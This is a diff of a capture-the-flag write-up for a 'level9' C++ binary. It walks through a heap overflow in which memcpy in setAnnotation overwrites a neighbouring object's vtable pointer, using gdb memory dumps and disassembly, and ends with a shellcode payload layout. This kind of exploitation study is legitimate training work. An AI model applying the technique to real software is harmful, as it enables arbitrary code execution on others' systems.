@@ -1,19 +1,125 @@
-find the offset
+we can see an overflow around argv1 = 100.
 
-./level9 AAAABBBBCCCC[...]
+this is a cpp binary. there is probably a class with several function . 
 
-write add of the stack at the offset  0xbfffff64 (this one need to match perfectly bc the prog take the ptr mov    eax,DWORD PTR [eax]) 
+One fct SetAnnotation with a memcpy :
 
-put some trash until 0xbfffff64 and there write an other add of the stack sur after  0xbfffff64 in our NOPS, for example  0xbfffff80
+gdb-peda$ xinfo 0x804870e
+0x804870e (<_ZN1N13setAnnotationEPc>:	push   ebp)
+Virtual memory mapping:
+Start : 0x08048000
+End   : 0x08049000
+Offset: 0x70e
+Perm  : r-xp <<--- we cannot  write here 
 
-mov    edx,DWORD PTR [eax]  <-  it take the pointer 
-	call   edx          <-  then execute it  ( nop nop nop nop ... shellcode )
+but after in the asm we can see that :    0x08048693 <+159>:	call   edx
 
-gives us : 
+it s a call to a vitual class  : 
+0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141
+0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a030:	0x41414141	0x41414141	0x00000041	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000 <-- just here
 
-TRASH + 0xbfffff64 + TRASH + 0xbfffff80 + NOPS + SHELLCODE
+
+
+0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141
+0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a030:	0x41414141	0x41414141	0x00414141	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000 ------------------- we can see our both class on the heap. 
+0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000			the first one will overrite the 2nd (memcpy)
+0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0e0:	0x00000006	0x00020f21	0x00000000	0x00000000
+0x804a0f0:	0x00000000	0x00000000	0x00000000	0x00000000
+
+In the call to <_ZN1N13setAnnotationEPc> we can overwrite [esp+0x10] thanks to memcpy.
+
+## objdump 
+080486f6 <_ZN1NC1Ei>:
+ 80486f6:	55                   	push   %ebp
+ 80486f7:	89 e5                	mov    %esp,%ebp
+ 80486f9:	8b 45 08             	mov    0x8(%ebp),%eax
+ 80486fc:	c7 00 48 88 04 08    	movl   $0x8048848,(%eax)
+ 8048702:	8b 45 08             	mov    0x8(%ebp),%eax          N(int x) : number(x) {}
+ 8048705:	8b 55 0c             	mov    0xc(%ebp),%edx
+ 8048708:	89 50 68             	mov    %edx,0x68(%eax)
+ 804870b:	5d                   	pop    %ebp
+ 804870c:	c3                   	ret
+ 804870d:	90                   	nop
+
+0804870e <_ZN1N13setAnnotationEPc>:
+ 804870e:	55                   	push   %ebp
+ 804870f:	89 e5                	mov    %esp,%ebp
+ 8048711:	83 ec 18             	sub    $0x18,%esp
+ 8048714:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 8048717:	89 04 24             	mov    %eax,(%esp)
+ 804871a:	e8 01 fe ff ff       	call   8048520 <strlen@plt>
+ 804871f:	8b 55 08             	mov    0x8(%ebp),%edx
+ 8048722:	83 c2 04             	add    $0x4,%edx
+ 8048725:	89 44 24 08          	mov    %eax,0x8(%esp)         	void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));}
+ 8048729:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 804872c:	89 44 24 04          	mov    %eax,0x4(%esp)
+ 8048730:	89 14 24             	mov    %edx,(%esp)
+ 8048733:	e8 d8 fd ff ff       	call   8048510 <memcpy@plt>
+ 8048738:	c9                   	leave
+ 8048739:	c3                   	ret
+
+0804873a <_ZN1NplERS_>:
+ 804873a:	55                   	push   %ebp
+ 804873b:	89 e5                	mov    %esp,%ebp
+ 804873d:	8b 45 08             	mov    0x8(%ebp),%eax
+ 8048740:	8b 50 68             	mov    0x68(%eax),%edx              virtual int operator+(N &r) {return number + r.number;}
+ 8048743:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 8048746:	8b 40 68             	mov    0x68(%eax),%eax
+ 8048749:	01 d0                	add    %edx,%eax
+ 804874b:	5d                   	pop    %ebp
+ 804874c:	c3                   	ret
+ 804874d:	90                   	nop
+
+0804874e <_ZN1NmiERS_>:
+ 804874e:	55                   	push   %ebp
+ 804874f:	89 e5                	mov    %esp,%ebp
+ 8048751:	8b 45 08             	mov    0x8(%ebp),%eax
+ 8048754:	8b 50 68             	mov    0x68(%eax),%edx
+ 8048757:	8b 45 0c             	mov    0xc(%ebp),%eax			    virtual int operator-(N &r) {return number - r.number;}
+ 804875a:	8b 40 68             	mov    0x68(%eax),%eax
+ 804875d:	89 d1                	mov    %edx,%ecx
+ 804875f:	29 c1                	sub    %eax,%ecx
+ 8048761:	89 c8                	mov    %ecx,%eax
+ 8048763:	5d                   	pop    %ebp
+ 8048764:	c3                   	ret
+ 8048765:	90                   	nop
+ 8048766:	90                   	nop
 
 
 
 
- 
+$ (gdb) disas main
+...
+0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+0x0804867c <+136>:	mov    eax, DWORD PTR [esp+0x10]   :  		gdb-peda$ xinfo $esp+0x10
+									0xbffff710 --> 0x804a078 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:	push   ebp)
+0x08048680 <+140>:	mov    eax, DWORD PTR [eax]
+0x08048682 <+142>:	mov    edx, DWORD PTR [eax]
+...
+0x08048693 <+159>:	call   edx
+...
+
+The value of [esp+0x10] will be replaced with 0x0804a00c
+The dereference of this address will lead to 0x0804a010 which leads to the beginning of our shellcode
+
+
+we need to dereference twice like we want to access to the virt class. 
+
+ADDR_BUFF+4   +  SHELLCODE  +  TRASH  + ADDR_BUFF 
